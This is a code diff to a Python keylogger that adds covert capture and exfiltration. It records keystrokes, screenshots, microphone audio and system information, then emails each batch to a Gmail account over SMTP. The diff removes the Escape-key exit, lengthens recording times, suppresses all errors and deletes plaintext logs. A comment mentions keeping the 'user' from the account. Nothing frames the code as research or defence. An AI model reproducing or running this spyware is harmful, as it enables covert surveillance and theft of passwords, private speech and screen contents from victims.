@@ -1,6 +1,8 @@
 #imports
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
+from email.mime.audio import MIMEAudio
+from email.mime.image import MIMEImage
 from email.mime.base import MIMEBase
 from email import encoders
 from pynput.keyboard import Key, Listener
@@ -9,7 +11,7 @@ from cryptography.fernet import Fernet
 from requests import get
 from multiprocessing import Process, freeze_support
 from PIL import ImageGrab
-import socket,platform,time,os,smtplib,getpass
+import socket,platform,time,os,smtplib,getpass,pyautogui
 import sounddevice as sd
 import getpass
 
@@ -28,18 +30,19 @@ encryptedlog = "/ereport.txt"
 encryptedsys = "/einfo.txt"
 audiopath = "/audio"
 imagepath = "/img"
-email_address = "<insert_email>"
-email_password = "<insert_password>"
-microphoneTime = 5
-periodOfAction = 2
+email_address = "your@gmail.com" #your gmail
+email_password = "insertyourpass" #your pass
+microphoneTime = 20
+periodOfAction = 10
 
 #globals
 global screenshot, audio
 screenshot = 0 
 audio = 0
+k = 0 
 
 timerIterations = 0
-timeIteration = 15
+timeIteration = 20
 currentTime = time.time()
 stoppingTime = time.time() + timeIteration
 
@@ -77,13 +80,9 @@ while timerIterations < periodOfAction:
                     f.write("\n")
 
     def on_release(key):
-        #stop on escape key press
-        if key == Key.esc:
-            return False
         if currentTime > stoppingTime:
             return False
 
-    #smtp google login is dead
     def send_email(filename, attachment, towho):
         try:
             #currently using same email to send and to receive, ideal would be to have two separate so the 'user' cant have access to account and infoo
@@ -92,7 +91,7 @@ while timerIterations < periodOfAction:
             msg['From'] = incoming
             msg['To'] = towho   
             msg['Subject'] = "sys_report.v1"
-            body = "Body_of_the_mail"
+            body = "this is your report sent from: " + str(socket.gethostbyname(socket.gethostname()))
             msg.attach(MIMEText(body,'plain'))
             filename = filename
             attachment = open(attachment, 'rb')
@@ -101,6 +100,58 @@ while timerIterations < periodOfAction:
             encoders.encode_base64(p)
             p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
             msg.attach(p)
+            s = smtplib.SMTP('smtp.gmail.com', 587)
+            s.starttls()
+            s.login(email_address, email_password)
+            text = msg.as_string()
+            s.sendmail(email_address, towho, text)
+            s.quit()
+        except:
+            pass
+    
+    def email_audio(filename, attachment, towho):
+        try:
+            #currently using same email to send and to receive, ideal would be to have two separate so the 'user' cant have access to account and infoo
+            incoming = email_address
+            msg = MIMEMultipart()
+            msg['From'] = incoming
+            msg['To'] = towho   
+            msg['Subject'] = "sys_report.v1"
+            body = "this is your report sent from: " + str(socket.gethostbyname(socket.gethostname()))
+            msg.attach(MIMEText(body,'plain'))
+            filename = filename
+            attachment = open(attachment, 'rb')
+            audio = MIMEAudio(attachment.read())
+            audio.set_payload((attachment).read())
+            encoders.encode_base64(audio)
+            audio.add_header('Content-Disposition', "attachment; filename= %s" % filename)
+            msg.attach(audio)
+            s = smtplib.SMTP('smtp.gmail.com', 587)
+            s.starttls()
+            s.login(email_address, email_password)
+            text = msg.as_string()
+            s.sendmail(email_address, towho, text)
+            s.quit()
+        except:
+            pass
+
+    def email_image(filename, attachment, towho):
+        try:
+            #currently using same email to send and to receive, ideal would be to have two separate so the 'user' cant have access to account and infoo
+            incoming = email_address
+            msg = MIMEMultipart()
+            msg['From'] = incoming
+            msg['To'] = towho   
+            msg['Subject'] = "sys_report.v1"
+            body = "this is your report sent from: " + str(socket.gethostbyname(socket.gethostname()))
+            msg.attach(MIMEText(body,'plain'))
+            filename = filename
+            attachment = open(attachment, 'rb')
+            image = MIMEImage(attachment.read())
+            image.set_payload((attachment).read())
+            encoders.encode_base64(image)
+            image.add_header('Content-Disposition', "attachment; filename= %s" % filename)
+            msg.attach(image)
             s = smtplib.SMTP('smtp.gmail.com', 587)
             s.starttls()
             s.login(email_address, email_password)
@@ -143,13 +194,11 @@ while timerIterations < periodOfAction:
         audio += 1
         return audio
 
-    audio = get_audio(audio)
-
     #takes screenshot
     def get_screen(screenshot):
         screenshotstr = str(screenshot)
         try:
-            image = ImageGrab.grab()
+            image = pyautogui.screenshot()
             image.save(filepath + imagepath + screenshotstr + ".png")
             screenshot += 1
         except Exception:
@@ -157,14 +206,17 @@ while timerIterations < periodOfAction:
 
         return screenshot
 
-    screenshot = get_screen(screenshot)
-
     with Listener(on_press = on_press, on_release = on_release) as listener:
         listener.join()
 
     if currentTime > stoppingTime:
         screenshot = get_screen(screenshot)
         audio = get_audio(audio)
+        email_audio("audio"+str(audio), filepath+audiopath+str(audio), email_address)
+        email_image("shot"+str(screenshot), filepath+imagepath+str(screenshot), email_address)
+        send_email("keylog"+str(k), filepath+logpath, email_address)
+        send_email("sysinfo"+str(k), filepath+syspath, email_address)
+        k+=1
         timerIterations += 1
         currentTime = time.time()
         stoppingTime = time.time() + timeIteration
@@ -183,10 +235,8 @@ for file in toEncrypt:
     with open(encrypted[j], "wb") as g:
         g.write(encryptedData)
 
-    send_email("logreport", toEncrypt[j], email_address)
-    
     #deletes the original file(non encrypted) 
     os.remove(toEncrypt[j])
     j += 1
 
-time.sleep(100)
+time.sleep(10)
